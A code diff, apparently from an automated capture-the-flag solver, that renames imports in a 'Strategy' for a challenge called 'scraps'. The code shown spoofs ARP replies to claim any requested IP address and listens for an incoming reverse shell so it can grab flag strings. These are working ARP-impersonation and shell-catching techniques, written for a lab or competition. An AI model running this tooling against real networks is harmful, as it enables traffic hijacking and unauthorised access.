@@ -1,12 +1,11 @@
 # coding: utf-8
-import scapy.all as scapy
-import capture
-import strategy
 import logging
 import re
+import scapy.all as scapy
+import snare
 import socket
+import strategy
 import subprocess
-import net
 import threading
 import time
 
@@ -21,7 +20,7 @@ class Strategy(strategy.Strategy):
     needsip = False
     challenges = ['scraps']
 
-    class ImpersonatorModule(capture.Module):
+    class ImpersonatorModule(snare.Module):
         """ImpresonatorModule watches for ARP packets and assumes any IP address it sees requested"""
         def __init__(self):
             self.ips = set()
@@ -32,8 +31,8 @@ class Strategy(strategy.Strategy):
 
         def process(self, pkt):
             if all(layer in pkt for layer in (scapy.Ether, scapy.ARP)):
-                if pkt[scapy.Ether].src != str(net.ifhwaddr(self.iface)) and pkt[scapy.ARP].op == 1: # who-has
-                    resp = scapy.Ether()/scapy.ARP(hwsrc=str(net.ifhwaddr('tap0')), hwdst=pkt.hwsrc, psrc=pkt.pdst, pdst=pkt.psrc, op="is-at")
+                if pkt[scapy.Ether].src != str(snare.net.ifhwaddr(self.iface)) and pkt[scapy.ARP].op == 1: # who-has
+                    resp = scapy.Ether()/scapy.ARP(hwsrc=str(snare.net.ifhwaddr('tap0')), hwdst=pkt.hwsrc, psrc=pkt.pdst, pdst=pkt.psrc, op="is-at")
                     scapy.sendp(resp, iface='tap0')
 
                     if pkt.pdst not in self.ips:
@@ -42,7 +41,7 @@ class Strategy(strategy.Strategy):
                         logger.info("Attaching new IP address {:s} to {:s}".format(cidr, self.iface))
                         subprocess.run(['ip', 'addr', 'add', cidr, 'dev', self.iface])
 
-    class ReverseShellCatcherModule(capture.Module):
+    class ReverseShellCatcherModule(snare.Module):
         """ReserveShellCatcherModule determines which port the reserve shell will connect on and listens for it"""
         def __init__(self, flagpattern):
             self.flagpattern = flagpattern
@@ -96,14 +95,14 @@ class Strategy(strategy.Strategy):
         def process(self, pkt):
             if all(layer in pkt for layer in (scapy.Ether, scapy.IP, scapy.TCP)):
                 logger.debug(pkt.sprintf("[%Ether.src%]%IP.src%:%TCP.sport% > [%Ether.dst%]%IP.dst%:%TCP.dport% %TCP.flags%"))
-                if pkt[scapy.Ether].dst == str(net.ifhwaddr(self.iface)) and pkt[scapy.TCP].flags == 2:
+                if pkt[scapy.Ether].dst == str(snare.net.ifhwaddr(self.iface)) and pkt[scapy.TCP].flags == 2:
                     self.bindaddr, self.bindport = pkt[scapy.IP].dst, pkt[scapy.TCP].dport
                     if self._thread is None or not self._thread.is_alive():
                         self._thread = threading.Thread(target=self.intercept)
                         self._thread.start()
 
     def execute(self, iface, flagpattern="flag\{.*?\}", canceltoken=None):
-        sniffer = capture.Sniffer(iface=iface)
+        sniffer = snare.Sniffer(iface=iface)
         interceptor = self.ReverseShellCatcherModule(flagpattern)
         sniffer.register(
             self.ImpersonatorModule(),
